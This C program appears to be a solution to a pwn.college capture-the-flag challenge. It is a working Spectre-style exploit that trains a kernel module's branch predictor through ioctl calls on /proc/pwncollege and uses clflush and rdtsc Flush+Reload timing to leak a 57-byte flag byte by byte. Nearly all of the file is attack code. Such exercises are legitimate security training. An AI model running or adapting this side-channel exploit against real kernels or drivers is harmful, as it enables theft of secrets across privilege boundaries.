#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <setjmp.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <semaphore.h>
#include <sys/ioctl.h>

#define CACHE_HIT_THRESHOLD 200
#define CACHE_LINE_SIZE 0x1000
#define BUFF_SIZE 255
char flag[0x100]= {0};
int fd;

void clear_cache(char *ptr)
{
    for (int i = 0x4; i < 0x80; i++)
    {
        _mm_clflush(ptr + (i+1) * 0x1000);
    }
}

char *shared_buffer;
void pre_work()
{
    char *addr;
    for(int j = 1; j < BUFF_SIZE; j++){
        addr = shared_buffer + j * CACHE_LINE_SIZE;
        _mm_clflush(addr);
    }
}

void train_target()
{
    char *mem = shared_buffer;
    for (int i = 0;i < 1000; i++)
    {
        int mix_i = ((i * 167) + 13) % 6;
        *(volatile int *)(mem) = mix_i;
        ioctl(fd, 0, 0);
    }

    // for (int i = 0; i < 400; i++)
    // {
    //     *(volatile int *)(sem + 1) = 0;
    //     sem_post(sem);
    //     sched_yield();

    // }
}

void speculate(int pos)
{
    char *mem = shared_buffer;

    for (int i = 0; i < 300; i++)
    {
        // int mix_i = ((i * 167) + 13) & 255;
        *(volatile int *)mem = 6 + pos;// mix_i + 257;
        ioctl(fd, 0, 0);
        //*(volatile int *)(sem + 1) = pos;
    }
}

uint64_t time_access_no_flush(void *p)
{
    uint64_t start, end;
    _mm_mfence();
    start = _rdtsc();
    volatile uint64_t x = *(volatile uint64_t*)p;
    _mm_mfence();
    end = _rdtsc();
    return end - start;
}

bool post_work_inner_work(int mix_i)
{
    char *addr;
    size_t cache_hit_threshold = CACHE_HIT_THRESHOLD;
    int offset;
    uint64_t t_no_flush;
    offset = (mix_i) * CACHE_LINE_SIZE;
    addr = shared_buffer + offset;
    t_no_flush = time_access_no_flush(addr);
    
    if (mix_i != 0 && mix_i != 255 && t_no_flush <= cache_hit_threshold)
    {
        printf("cache hit %d timing:%lld\n", mix_i, t_no_flush);
        return true;
    }
    return false;
}

uint64_t post_work_inner_work_min(int mix_i)
{
    char *addr;
    size_t cache_hit_threshold = CACHE_HIT_THRESHOLD;
    int offset;
    uint64_t t_no_flush;
    offset = (mix_i) * CACHE_LINE_SIZE;
    addr = shared_buffer + offset;
    return time_access_no_flush(addr);
}

int post_work(int *stats){
    for (size_t i = 0x4; i < 0x80; i++)
    {
        int mix_i = i; // ((i * 167) + 13) & 255;
        if (post_work_inner_work(mix_i)) {
            stats[mix_i]++;
        }
    }
}

bool unsolved(int *results, int length)
{
    for (int i = 0; i < length; i++)
    {
        if (results[i] == 0)
            return true;
    }
    return false;
}

void exploit(int len)
{
    int *results = malloc(sizeof(int) * len + 1);
    int max_index = 0;
    int max_val = 0;
    int stats[256] = {0};
    while(unsolved(results, len))
    {
        for (int i =0; i < len; )
        {
            if (results[i] != '\x00')
                continue;
            for (int j = 0; j < 255; j++)
                stats[j] = 0;
            if (!unsolved(results, len)){
                break;
            }

            for (int j = 0; j < 4000; j++){
                pre_work();
                train_target();
                pre_work();

                speculate(i);
                post_work(stats);
            }
            max_val = 0;
            max_index = 0;
            for(int j = 0x4; j < 0x80; j++){
                if(stats[j] > max_val)
                {
                    max_index = j;
                    max_val = stats[j];
                }
            }
            if (max_index != 0 && max_val > 4){
                results[i] = max_index;
                printf("attempted index %i found %d = %c with %d hits\n", i, max_index, max_index, stats[max_index]);
                i++;
            }
            else
            {
                printf("research\n");
            }
            // printf("Current results\n");
            // for (int j = 0; j < len; j++)
            // {
            //     printf("index: %d value: %c\n", j, results[j]);
            // }

        }
    }

    for (int i =0; i < len; i++)
        printf("%c", results[i]);

}



char pos[256];

int main()
{   
    fd = open("/proc/pwncollege", O_RDWR);
    if (fd == -1)
    {
        perror("open /proc/pwncollgeg failed !");
        exit(1);
    }
    char *addr = (char *)mmap(0, 255 * 0x1000, PROT_WRITE | PROT_READ, MAP_SHARED, fd, 0);

    shared_buffer = addr;
    exploit(57);
    // printf("end\n");
    return 0;
}